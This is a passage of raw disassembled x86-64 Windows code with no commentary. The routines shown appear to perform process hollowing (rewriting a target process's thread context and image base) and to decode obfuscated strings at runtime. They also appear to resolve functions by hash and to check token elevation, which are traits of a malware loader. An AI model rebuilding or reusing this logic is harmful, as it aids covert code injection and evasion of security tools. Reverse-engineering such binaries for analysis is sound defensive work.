   140003c27:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140003c2c:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003c32:	48 89 f9             	mov    %rdi,%rcx
   140003c35:	31 d2                	xor    %edx,%edx
   140003c37:	e8 94 61 00 00       	call   0x140009dd0
   140003c3c:	c7 84 24 a0 00 00 00 	movl   $0x100002,0xa0(%rsp)
   140003c43:	02 00 10 00 
   140003c47:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003c4c:	48 89 fa             	mov    %rdi,%rdx
   140003c4f:	e8 37 d8 ff ff       	call   0x14000148b
   140003c54:	85 c0                	test   %eax,%eax
   140003c56:	78 70                	js     0x140003cc8
   140003c58:	42 8b 44 3e 28       	mov    0x28(%rsi,%r15,1),%eax
   140003c5d:	48 03 44 24 30       	add    0x30(%rsp),%rax
   140003c62:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   140003c69:	00 
   140003c6a:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003c6f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003c74:	e8 21 d8 ff ff       	call   0x14000149a
   140003c79:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003c7e:	85 c0                	test   %eax,%eax
   140003c80:	78 4b                	js     0x140003ccd
   140003c82:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140003c89:	00 
   140003c8a:	48 83 c2 10          	add    $0x10,%rdx
   140003c8e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003c95:	00 00 
   140003c97:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003c9c:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140003ca2:	e8 11 d8 ff ff       	call   0x1400014b8
   140003ca7:	85 c0                	test   %eax,%eax
   140003ca9:	78 1d                	js     0x140003cc8
   140003cab:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003cb0:	31 d2                	xor    %edx,%edx
   140003cb2:	e8 c5 d7 ff ff       	call   0x14000147c
   140003cb7:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003cbc:	e8 9d d7 ff ff       	call   0x14000145e
   140003cc1:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140003cc6:	eb 13                	jmp    0x140003cdb
   140003cc8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140003ccd:	31 d2                	xor    %edx,%edx
   140003ccf:	e8 f2 d8 ff ff       	call   0x1400015c6
   140003cd4:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   140003cdb:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003ce0:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003ce5:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140003cea:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140003cef:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140003cf4:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003cfb:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140003d01:	e8 c1 d7 ff ff       	call   0x1400014c7
   140003d06:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140003d0a:	74 32                	je     0x140003d3e
   140003d0c:	80 bc 24 c8 05 00 00 	cmpb   $0x0,0x5c8(%rsp)
   140003d13:	00 
   140003d14:	74 20                	je     0x140003d36
   140003d16:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140003d1d:	00 
   140003d1e:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140003d23:	48 89 f9             	mov    %rdi,%rcx
   140003d26:	ba 1d 00 00 00       	mov    $0x1d,%edx
   140003d2b:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003d31:	e8 dd d6 ff ff       	call   0x140001413
   140003d36:	48 89 f9             	mov    %rdi,%rcx
   140003d39:	e8 20 d7 ff ff       	call   0x14000145e
   140003d3e:	90                   	nop
   140003d3f:	48 81 c4 48 05 00 00 	add    $0x548,%rsp
   140003d46:	5b                   	pop    %rbx
   140003d47:	5d                   	pop    %rbp
   140003d48:	5f                   	pop    %rdi
   140003d49:	5e                   	pop    %rsi
   140003d4a:	41 5c                	pop    %r12
   140003d4c:	41 5d                	pop    %r13
   140003d4e:	41 5e                	pop    %r14
   140003d50:	41 5f                	pop    %r15
   140003d52:	c3                   	ret
   140003d53:	cc                   	int3
   140003d54:	cc                   	int3
   140003d55:	cc                   	int3
   140003d56:	cc                   	int3
   140003d57:	cc                   	int3
   140003d58:	cc                   	int3
   140003d59:	cc                   	int3
   140003d5a:	cc                   	int3
   140003d5b:	cc                   	int3
   140003d5c:	cc                   	int3
   140003d5d:	cc                   	int3
   140003d5e:	cc                   	int3
   140003d5f:	cc                   	int3
   140003d60:	55                   	push   %rbp
   140003d61:	41 57                	push   %r15
   140003d63:	41 56                	push   %r14
   140003d65:	41 55                	push   %r13
   140003d67:	41 54                	push   %r12
   140003d69:	56                   	push   %rsi
   140003d6a:	57                   	push   %rdi
   140003d6b:	53                   	push   %rbx
   140003d6c:	b8 e8 17 00 00       	mov    $0x17e8,%eax
   140003d71:	e8 ea e8 ff ff       	call   0x140002660
   140003d76:	48 29 c4             	sub    %rax,%rsp
   140003d79:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140003d80:	00 
   140003d81:	0f 29 b5 50 17 00 00 	movaps %xmm6,0x1750(%rbp)
   140003d88:	e8 33 d9 ff ff       	call   0x1400016c0
   140003d8d:	80 3d 05 a1 28 00 00 	cmpb   $0x0,0x28a105(%rip)        # 0x14028de99
   140003d94:	0f 84 00 32 00 00    	je     0x140006f9a
   140003d9a:	80 3d b5 a2 28 00 00 	cmpb   $0x0,0x28a2b5(%rip)        # 0x14028e056
   140003da1:	0f 84 c9 00 00 00    	je     0x140003e70
   140003da7:	66 0f 6f 05 61 68 00 	movdqa 0x6861(%rip),%xmm0        # 0x14000a610
   140003dae:	00 
   140003daf:	66 0f 6f 0d 49 a2 28 	movdqa 0x28a249(%rip),%xmm1        # 0x14028e000
   140003db6:	00 
   140003db7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003dbb:	66 0f 6f 15 5d 68 00 	movdqa 0x685d(%rip),%xmm2        # 0x14000a620
   140003dc2:	00 
   140003dc3:	66 0f db ca          	pand   %xmm2,%xmm1
   140003dc7:	66 0f 7f 0d 31 a2 28 	movdqa %xmm1,0x28a231(%rip)        # 0x14028e000
   140003dce:	00 
   140003dcf:	66 0f 6f 0d 39 a2 28 	movdqa 0x28a239(%rip),%xmm1        # 0x14028e010
   140003dd6:	00 
   140003dd7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003ddb:	66 0f db ca          	pand   %xmm2,%xmm1
   140003ddf:	66 0f 7f 0d 29 a2 28 	movdqa %xmm1,0x28a229(%rip)        # 0x14028e010
   140003de6:	00 
   140003de7:	66 0f 6f 0d 31 a2 28 	movdqa 0x28a231(%rip),%xmm1        # 0x14028e020
   140003dee:	00 
   140003def:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003df3:	66 0f db ca          	pand   %xmm2,%xmm1
   140003df7:	66 0f 7f 0d 21 a2 28 	movdqa %xmm1,0x28a221(%rip)        # 0x14028e020
   140003dfe:	00 
   140003dff:	66 0f 6f 0d 29 a2 28 	movdqa 0x28a229(%rip),%xmm1        # 0x14028e030
   140003e06:	00 
   140003e07:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140003e0b:	66 0f db ca          	pand   %xmm2,%xmm1
   140003e0f:	66 0f 7f 0d 19 a2 28 	movdqa %xmm1,0x28a219(%rip)        # 0x14028e030
   140003e16:	00 
   140003e17:	66 0f fd 05 21 a2 28 	paddw  0x28a221(%rip),%xmm0        # 0x14028e040
   140003e1e:	00 
   140003e1f:	66 0f db c2          	pand   %xmm2,%xmm0
   140003e23:	66 0f 7f 05 15 a2 28 	movdqa %xmm0,0x28a215(%rip)        # 0x14028e040
   140003e2a:	00 
   140003e2b:	b8 bf 00 00 00       	mov    $0xbf,%eax
   140003e30:	8b 0d 1a a2 28 00    	mov    0x28a21a(%rip),%ecx        # 0x14028e050
   140003e36:	01 c1                	add    %eax,%ecx
   140003e38:	0f b6 c9             	movzbl %cl,%ecx
   140003e3b:	66 89 0d 0e a2 28 00 	mov    %cx,0x28a20e(%rip)        # 0x14028e050
   140003e42:	0f b7 0d 09 a2 28 00 	movzwl 0x28a209(%rip),%ecx        # 0x14028e052
   140003e49:	81 c1 bf 00 00 00    	add    $0xbf,%ecx
   140003e4f:	0f b6 c9             	movzbl %cl,%ecx
   140003e52:	66 89 0d f9 a1 28 00 	mov    %cx,0x28a1f9(%rip)        # 0x14028e052
   140003e59:	03 05 f5 a1 28 00    	add    0x28a1f5(%rip),%eax        # 0x14028e054
   140003e5f:	0f b6 c0             	movzbl %al,%eax
   140003e62:	66 89 05 eb a1 28 00 	mov    %ax,0x28a1eb(%rip)        # 0x14028e054
   140003e69:	c6 05 e6 a1 28 00 00 	movb   $0x0,0x28a1e6(%rip)        # 0x14028e056
   140003e70:	48 c7 85 d0 16 00 00 	movq   $0x0,0x16d0(%rbp)
   140003e77:	00 00 00 00 
   140003e7b:	48 8d 35 7e a1 28 00 	lea    0x28a17e(%rip),%rsi        # 0x14028e000
   140003e82:	48 89 f1             	mov    %rsi,%rcx
   140003e85:	e8 66 5e 00 00       	call   0x140009cf0
   140003e8a:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003e91:	01 c0                	add    %eax,%eax
   140003e93:	66 89 8d d2 16 00 00 	mov    %cx,0x16d2(%rbp)
   140003e9a:	66 89 85 d0 16 00 00 	mov    %ax,0x16d0(%rbp)
   140003ea1:	48 89 b5 d8 16 00 00 	mov    %rsi,0x16d8(%rbp)
   140003ea8:	c7 85 a0 16 00 00 30 	movl   $0x30,0x16a0(%rbp)
   140003eaf:	00 00 00 
   140003eb2:	48 c7 85 a8 16 00 00 	movq   $0x0,0x16a8(%rbp)
   140003eb9:	00 00 00 00 
   140003ebd:	c7 85 b8 16 00 00 00 	movl   $0x0,0x16b8(%rbp)
   140003ec4:	00 00 00 
   140003ec7:	48 8d 85 d0 16 00 00 	lea    0x16d0(%rbp),%rax
   140003ece:	48 89 85 b0 16 00 00 	mov    %rax,0x16b0(%rbp)
   140003ed5:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140003ed9:	f3 0f 7f 85 c0 16 00 	movdqu %xmm0,0x16c0(%rbp)
   140003ee0:	00 
   140003ee1:	48 8d 8d 98 16 00 00 	lea    0x1698(%rbp),%rcx
   140003ee8:	4c 8d 85 a0 16 00 00 	lea    0x16a0(%rbp),%r8
   140003eef:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140003ef4:	41 b1 01             	mov    $0x1,%r9b
   140003ef7:	e8 43 d6 ff ff       	call   0x14000153f
   140003efc:	85 c0                	test   %eax,%eax
   140003efe:	0f 88 79 30 00 00    	js     0x140006f7d
   140003f04:	48 c7 85 50 10 00 00 	movq   $0x0,0x1050(%rbp)
   140003f0b:	00 00 00 00 
   140003f0f:	4c 8d 85 50 10 00 00 	lea    0x1050(%rbp),%r8
   140003f16:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140003f1d:	ba 08 00 00 00       	mov    $0x8,%edx
   140003f22:	e8 dc d5 ff ff       	call   0x140001503
   140003f27:	c7 85 60 12 00 00 00 	movl   $0x0,0x1260(%rbp)
   140003f2e:	00 00 00 
   140003f31:	48 8b 8d 50 10 00 00 	mov    0x1050(%rbp),%rcx
   140003f38:	48 85 c9             	test   %rcx,%rcx
   140003f3b:	74 40                	je     0x140003f7d
   140003f3d:	48 8d 85 60 12 00 00 	lea    0x1260(%rbp),%rax
   140003f44:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003f49:	4c 8d 85 30 0c 00 00 	lea    0xc30(%rbp),%r8
   140003f50:	ba 14 00 00 00       	mov    $0x14,%edx
   140003f55:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003f5b:	e8 0c d6 ff ff       	call   0x14000156c
   140003f60:	85 c0                	test   %eax,%eax
   140003f62:	78 19                	js     0x140003f7d
   140003f64:	48 8b 8d 50 10 00 00 	mov    0x1050(%rbp),%rcx
   140003f6b:	e8 ee d4 ff ff       	call   0x14000145e
   140003f70:	83 bd 30 0c 00 00 00 	cmpl   $0x0,0xc30(%rbp)
   140003f77:	41 0f 95 c5          	setne  %r13b
   140003f7b:	eb 03                	jmp    0x140003f80
   140003f7d:	45 31 ed             	xor    %r13d,%r13d
   140003f80:	b9 a6 d2 7f 85       	mov    $0x857fd2a6,%ecx
   140003f85:	e8 26 58 00 00       	call   0x1400097b0
   140003f8a:	89 c0                	mov    %eax,%eax
   140003f8c:	65 48 8b 18          	mov    %gs:(%rax),%rbx
   140003f90:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003f94:	48 8b b0 80 00 00 00 	mov    0x80(%rax),%rsi
   140003f9b:	48 8d bd 30 0c 00 00 	lea    0xc30(%rbp),%rdi
   140003fa2:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003fa8:	48 89 f9             	mov    %rdi,%rcx
   140003fab:	31 d2                	xor    %edx,%edx
   140003fad:	e8 1e 5e 00 00       	call   0x140009dd0
   140003fb2:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140003fb6:	48 8b 50 68          	mov    0x68(%rax),%rdx
   140003fba:	48 89 f9             	mov    %rdi,%rcx
   140003fbd:	e8 0e 5d 00 00       	call   0x140009cd0
   140003fc2:	48 8d 8d 60 12 00 00 	lea    0x1260(%rbp),%rcx
   140003fc9:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003fcf:	31 d2                	xor    %edx,%edx
   140003fd1:	e8 fa 5d 00 00       	call   0x140009dd0
   140003fd6:	80 3d bd 9e 28 00 00 	cmpb   $0x0,0x289ebd(%rip)        # 0x14028de9a
   140003fdd:	0f 84 3c 30 00 00    	je     0x14000701f
   140003fe3:	80 3d 8e a0 28 00 00 	cmpb   $0x0,0x28a08e(%rip)        # 0x14028e078
   140003fea:	74 47                	je     0x140004033
   140003fec:	66 0f 6f 05 6c a0 28 	movdqa 0x28a06c(%rip),%xmm0        # 0x14028e060
   140003ff3:	00 
   140003ff4:	66 0f fd 05 44 66 00 	paddw  0x6644(%rip),%xmm0        # 0x14000a640
   140003ffb:	00 
   140003ffc:	66 0f db 05 1c 66 00 	pand   0x661c(%rip),%xmm0        # 0x14000a620
   140004003:	00 
   140004004:	66 0f 7f 05 54 a0 28 	movdqa %xmm0,0x28a054(%rip)        # 0x14028e060
   14000400b:	00 
   14000400c:	f3 0f 7e 05 5c a0 28 	movq   0x28a05c(%rip),%xmm0        # 0x14028e070
   140004013:	00 
   140004014:	66 0f fd 05 34 66 00 	paddw  0x6634(%rip),%xmm0        # 0x14000a650
   14000401b:	00 
   14000401c:	66 0f db 05 3c 66 00 	pand   0x663c(%rip),%xmm0        # 0x14000a660
   140004023:	00 
   140004024:	66 0f d6 05 44 a0 28 	movq   %xmm0,0x28a044(%rip)        # 0x14028e070
   14000402b:	00 
   14000402c:	c6 05 45 a0 28 00 00 	movb   $0x0,0x28a045(%rip)        # 0x14028e078
   140004033:	48 8d 0d 26 a0 28 00 	lea    0x28a026(%rip),%rcx        # 0x14028e060
   14000403a:	e8 b1 5c 00 00       	call   0x140009cf0
   14000403f:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140004043:	74 49                	je     0x14000408e
   140004045:	49 89 c6             	mov    %rax,%r14
   140004048:	4c 8d 3d 11 a0 28 00 	lea    0x28a011(%rip),%r15        # 0x14028e060
   14000404f:	31 db                	xor    %ebx,%ebx
   140004051:	49 89 f4             	mov    %rsi,%r12
   140004054:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000405b:	00 00 00 00 00 
   140004060:	4c 89 e1             	mov    %r12,%rcx
   140004063:	4c 89 fa             	mov    %r15,%rdx
   140004066:	4d 89 f0             	mov    %r14,%r8
   140004069:	e8 12 5d 00 00       	call   0x140009d80
   14000406e:	85 c0                	test   %eax,%eax
   140004070:	0f 84 aa 03 00 00    	je     0x140004420
   140004076:	4c 89 e1             	mov    %r12,%rcx
   140004079:	e8 72 5c 00 00       	call   0x140009cf0
   14000407e:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   140004085:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   14000408a:	75 d4                	jne    0x140004060
   14000408c:	eb 02                	jmp    0x140004090
   14000408e:	31 db                	xor    %ebx,%ebx
   140004090:	80 3d 04 9e 28 00 00 	cmpb   $0x0,0x289e04(%rip)        # 0x14028de9b
   140004097:	0f 84 94 03 00 00    	je     0x140004431
   14000409d:	80 3d f0 9f 28 00 00 	cmpb   $0x0,0x289ff0(%rip)        # 0x14028e094
   1400040a4:	74 47                	je     0x1400040ed
   1400040a6:	66 0f 6f 05 d2 9f 28 	movdqa 0x289fd2(%rip),%xmm0        # 0x14028e080
   1400040ad:	00 
   1400040ae:	66 0f fd 05 8a 65 00 	paddw  0x658a(%rip),%xmm0        # 0x14000a640
   1400040b5:	00 
   1400040b6:	66 0f db 05 62 65 00 	pand   0x6562(%rip),%xmm0        # 0x14000a620
   1400040bd:	00 
   1400040be:	66 0f 7f 05 ba 9f 28 	movdqa %xmm0,0x289fba(%rip)        # 0x14028e080
   1400040c5:	00 
   1400040c6:	66 0f 6f 05 c2 9f 28 	movdqa 0x289fc2(%rip),%xmm0        # 0x14028e090
   1400040cd:	00 
   1400040ce:	66 0f fd 05 aa 65 00 	paddw  0x65aa(%rip),%xmm0        # 0x14000a680
   1400040d5:	00 
   1400040d6:	66 0f db 05 b2 65 00 	pand   0x65b2(%rip),%xmm0        # 0x14000a690
   1400040dd:	00 
   1400040de:	66 0f 7e 05 aa 9f 28 	movd   %xmm0,0x289faa(%rip)        # 0x14028e090
   1400040e5:	00 
   1400040e6:	c6 05 a7 9f 28 00 00 	movb   $0x0,0x289fa7(%rip)        # 0x14028e094
   1400040ed:	4c 8d b5 60 12 00 00 	lea    0x1260(%rbp),%r14
   1400040f4:	4c 89 f1             	mov    %r14,%rcx
   1400040f7:	48 89 da             	mov    %rbx,%rdx
   1400040fa:	e8 e1 5b 00 00       	call   0x140009ce0
   1400040ff:	48 8d 15 7a 9f 28 00 	lea    0x289f7a(%rip),%rdx        # 0x14028e080
   140004106:	4c 89 f1             	mov    %r14,%rcx
   140004109:	e8 c2 5b 00 00       	call   0x140009cd0
   14000410e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004112:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004118:	31 d2                	xor    %edx,%edx
   14000411a:	e8 b1 5c 00 00       	call   0x140009dd0
   14000411f:	80 3d 76 9d 28 00 00 	cmpb   $0x0,0x289d76(%rip)        # 0x14028de9c
   140004126:	0f 84 40 2f 00 00    	je     0x14000706c
   14000412c:	80 3d bb 9f 28 00 00 	cmpb   $0x0,0x289fbb(%rip)        # 0x14028e0ee
   140004133:	0f 84 fb 00 00 00    	je     0x140004234
   140004139:	66 0f 6f 05 5f 65 00 	movdqa 0x655f(%rip),%xmm0        # 0x14000a6a0
   140004140:	00 
   140004141:	66 0f 6f 0d 57 9f 28 	movdqa 0x289f57(%rip),%xmm1        # 0x14028e0a0
   140004148:	00 
   140004149:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000414d:	66 0f 6f 15 cb 64 00 	movdqa 0x64cb(%rip),%xmm2        # 0x14000a620
   140004154:	00 
   140004155:	66 0f db ca          	pand   %xmm2,%xmm1
   140004159:	66 0f 7f 0d 3f 9f 28 	movdqa %xmm1,0x289f3f(%rip)        # 0x14028e0a0
   140004160:	00 
   140004161:	66 0f 6f 0d 47 9f 28 	movdqa 0x289f47(%rip),%xmm1        # 0x14028e0b0
   140004168:	00 
   140004169:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000416d:	66 0f db ca          	pand   %xmm2,%xmm1
   140004171:	66 0f 7f 0d 37 9f 28 	movdqa %xmm1,0x289f37(%rip)        # 0x14028e0b0
   140004178:	00 
   140004179:	66 0f 6f 0d 3f 9f 28 	movdqa 0x289f3f(%rip),%xmm1        # 0x14028e0c0
   140004180:	00 
   140004181:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004185:	66 0f db ca          	pand   %xmm2,%xmm1
   140004189:	66 0f 7f 0d 2f 9f 28 	movdqa %xmm1,0x289f2f(%rip)        # 0x14028e0c0
   140004190:	00 
   140004191:	66 0f fd 05 37 9f 28 	paddw  0x289f37(%rip),%xmm0        # 0x14028e0d0
   140004198:	00 
   140004199:	66 0f db c2          	pand   %xmm2,%xmm0
   14000419d:	66 0f 7f 05 2b 9f 28 	movdqa %xmm0,0x289f2b(%rip)        # 0x14028e0d0
   1400041a4:	00 
   1400041a5:	8b 05 35 9f 28 00    	mov    0x289f35(%rip),%eax        # 0x14028e0e0
   1400041ab:	83 c0 5d             	add    $0x5d,%eax
   1400041ae:	0f b6 c0             	movzbl %al,%eax
   1400041b1:	66 89 05 28 9f 28 00 	mov    %ax,0x289f28(%rip)        # 0x14028e0e0
   1400041b8:	0f b7 05 23 9f 28 00 	movzwl 0x289f23(%rip),%eax        # 0x14028e0e2
   1400041bf:	83 c0 5d             	add    $0x5d,%eax
   1400041c2:	0f b6 c0             	movzbl %al,%eax
   1400041c5:	66 89 05 16 9f 28 00 	mov    %ax,0x289f16(%rip)        # 0x14028e0e2
   1400041cc:	8b 05 12 9f 28 00    	mov    0x289f12(%rip),%eax        # 0x14028e0e4
   1400041d2:	83 c0 5d             	add    $0x5d,%eax
   1400041d5:	0f b6 c0             	movzbl %al,%eax
   1400041d8:	66 89 05 05 9f 28 00 	mov    %ax,0x289f05(%rip)        # 0x14028e0e4
   1400041df:	0f b7 05 00 9f 28 00 	movzwl 0x289f00(%rip),%eax        # 0x14028e0e6
   1400041e6:	83 c0 5d             	add    $0x5d,%eax
   1400041e9:	0f b6 c0             	movzbl %al,%eax
   1400041ec:	66 89 05 f3 9e 28 00 	mov    %ax,0x289ef3(%rip)        # 0x14028e0e6
   1400041f3:	8b 05 ef 9e 28 00    	mov    0x289eef(%rip),%eax        # 0x14028e0e8
   1400041f9:	83 c0 5d             	add    $0x5d,%eax
   1400041fc:	0f b6 c0             	movzbl %al,%eax
   1400041ff:	66 89 05 e2 9e 28 00 	mov    %ax,0x289ee2(%rip)        # 0x14028e0e8
   140004206:	0f b7 05 dd 9e 28 00 	movzwl 0x289edd(%rip),%eax        # 0x14028e0ea
   14000420d:	83 c0 5d             	add    $0x5d,%eax
   140004210:	0f b6 c0             	movzbl %al,%eax
   140004213:	66 89 05 d0 9e 28 00 	mov    %ax,0x289ed0(%rip)        # 0x14028e0ea
   14000421a:	8b 05 cc 9e 28 00    	mov    0x289ecc(%rip),%eax        # 0x14028e0ec
   140004220:	83 c0 5d             	add    $0x5d,%eax
   140004223:	0f b6 c0             	movzbl %al,%eax
   140004226:	66 89 05 bf 9e 28 00 	mov    %ax,0x289ebf(%rip)        # 0x14028e0ec
   14000422d:	c6 05 ba 9e 28 00 00 	movb   $0x0,0x289eba(%rip)        # 0x14028e0ee
   140004234:	4c 8d 7d d0          	lea    -0x30(%rbp),%r15
   140004238:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000423f:	4c 89 f9             	mov    %r15,%rcx
   140004242:	e8 99 5a 00 00       	call   0x140009ce0
   140004247:	48 8d 15 52 9e 28 00 	lea    0x289e52(%rip),%rdx        # 0x14028e0a0
   14000424e:	4c 89 f9             	mov    %r15,%rcx
   140004251:	e8 7a 5a 00 00       	call   0x140009cd0
   140004256:	45 84 ed             	test   %r13b,%r13b
   140004259:	0f 84 e2 00 00 00    	je     0x140004341
   14000425f:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   140004266:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000426c:	31 d2                	xor    %edx,%edx
   14000426e:	e8 5d 5b 00 00       	call   0x140009dd0
   140004273:	80 3d 24 9c 28 00 00 	cmpb   $0x0,0x289c24(%rip)        # 0x14028de9e
   14000427a:	0f 84 60 2e 00 00    	je     0x1400070e0
   140004280:	80 3d d3 9e 28 00 00 	cmpb   $0x0,0x289ed3(%rip)        # 0x14028e15a
   140004287:	74 5a                	je     0x1400042e3
   140004289:	66 0f 6f 05 af 9e 28 	movdqa 0x289eaf(%rip),%xmm0        # 0x14028e140
   140004290:	00 
   140004291:	66 0f fd 05 37 64 00 	paddw  0x6437(%rip),%xmm0        # 0x14000a6d0
   140004298:	00 
   140004299:	66 0f db 05 7f 63 00 	pand   0x637f(%rip),%xmm0        # 0x14000a620
   1400042a0:	00 
   1400042a1:	66 0f 7f 05 97 9e 28 	movdqa %xmm0,0x289e97(%rip)        # 0x14028e140
   1400042a8:	00 
   1400042a9:	f3 0f 7e 05 9f 9e 28 	movq   0x289e9f(%rip),%xmm0        # 0x14028e150
   1400042b0:	00 
   1400042b1:	66 0f fd 05 27 64 00 	paddw  0x6427(%rip),%xmm0        # 0x14000a6e0
   1400042b8:	00 
   1400042b9:	66 0f db 05 9f 63 00 	pand   0x639f(%rip),%xmm0        # 0x14000a660
   1400042c0:	00 
   1400042c1:	66 0f d6 05 87 9e 28 	movq   %xmm0,0x289e87(%rip)        # 0x14028e150
   1400042c8:	00 
   1400042c9:	8b 05 89 9e 28 00    	mov    0x289e89(%rip),%eax        # 0x14028e158
   1400042cf:	83 c0 2f             	add    $0x2f,%eax
   1400042d2:	0f b6 c0             	movzbl %al,%eax
   1400042d5:	66 89 05 7c 9e 28 00 	mov    %ax,0x289e7c(%rip)        # 0x14028e158
   1400042dc:	c6 05 77 9e 28 00 00 	movb   $0x0,0x289e77(%rip)        # 0x14028e15a
   1400042e3:	48 8d 0d 56 9e 28 00 	lea    0x289e56(%rip),%rcx        # 0x14028e140
   1400042ea:	e8 01 5a 00 00       	call   0x140009cf0
   1400042ef:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   1400042f3:	0f 84 7e 01 00 00    	je     0x140004477
   1400042f9:	48 89 c3             	mov    %rax,%rbx
   1400042fc:	4c 8d 35 3d 9e 28 00 	lea    0x289e3d(%rip),%r14        # 0x14028e140
   140004303:	31 ff                	xor    %edi,%edi
   140004305:	49 89 f4             	mov    %rsi,%r12
   140004308:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000430f:	00 
   140004310:	4c 89 e1             	mov    %r12,%rcx
   140004313:	4c 89 f2             	mov    %r14,%rdx
   140004316:	49 89 d8             	mov    %rbx,%r8
   140004319:	e8 62 5a 00 00       	call   0x140009d80
   14000431e:	85 c0                	test   %eax,%eax
   140004320:	0f 84 55 01 00 00    	je     0x14000447b
   140004326:	4c 89 e1             	mov    %r12,%rcx
   140004329:	e8 c2 59 00 00       	call   0x140009cf0
   14000432e:	66 41 83 7c 44 02 00 	cmpw   $0x0,0x2(%r12,%rax,2)
   140004335:	4d 8d 64 44 02       	lea    0x2(%r12,%rax,2),%r12
   14000433a:	75 d4                	jne    0x140004310
   14000433c:	e9 3e 01 00 00       	jmp    0x14000447f
   140004341:	80 3d 55 9b 28 00 00 	cmpb   $0x0,0x289b55(%rip)        # 0x14028de9d
   140004348:	0f 84 e8 2d 00 00    	je     0x140007136
   14000434e:	80 3d df 9d 28 00 00 	cmpb   $0x0,0x289ddf(%rip)        # 0x14028e134
   140004355:	0f 84 9e 00 00 00    	je     0x1400043f9
   14000435b:	66 0f 6f 05 4d 63 00 	movdqa 0x634d(%rip),%xmm0        # 0x14000a6b0
   140004362:	00 
   140004363:	66 0f 6f 0d 85 9d 28 	movdqa 0x289d85(%rip),%xmm1        # 0x14028e0f0
   14000436a:	00 
   14000436b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000436f:	66 0f 6f 15 a9 62 00 	movdqa 0x62a9(%rip),%xmm2        # 0x14000a620
   140004376:	00 
   140004377:	66 0f db ca          	pand   %xmm2,%xmm1
   14000437b:	66 0f 7f 0d 6d 9d 28 	movdqa %xmm1,0x289d6d(%rip)        # 0x14028e0f0
   140004382:	00 
   140004383:	66 0f 6f 0d 75 9d 28 	movdqa 0x289d75(%rip),%xmm1        # 0x14028e100
   14000438a:	00 
   14000438b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000438f:	66 0f db ca          	pand   %xmm2,%xmm1
   140004393:	66 0f 7f 0d 65 9d 28 	movdqa %xmm1,0x289d65(%rip)        # 0x14028e100
   14000439a:	00 
   14000439b:	66 0f 6f 0d 6d 9d 28 	movdqa 0x289d6d(%rip),%xmm1        # 0x14028e110
   1400043a2:	00 
   1400043a3:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400043a7:	66 0f db ca          	pand   %xmm2,%xmm1
   1400043ab:	66 0f 7f 0d 5d 9d 28 	movdqa %xmm1,0x289d5d(%rip)        # 0x14028e110
   1400043b2:	00 
   1400043b3:	66 0f fd 05 65 9d 28 	paddw  0x289d65(%rip),%xmm0        # 0x14028e120
   1400043ba:	00 
   1400043bb:	66 0f db c2          	pand   %xmm2,%xmm0
   1400043bf:	66 0f 7f 05 59 9d 28 	movdqa %xmm0,0x289d59(%rip)        # 0x14028e120
   1400043c6:	00 
   1400043c7:	b8 ef 00 00 00       	mov    $0xef,%eax
   1400043cc:	03 05 5e 9d 28 00    	add    0x289d5e(%rip),%eax        # 0x14028e130
   1400043d2:	0f b6 c0             	movzbl %al,%eax
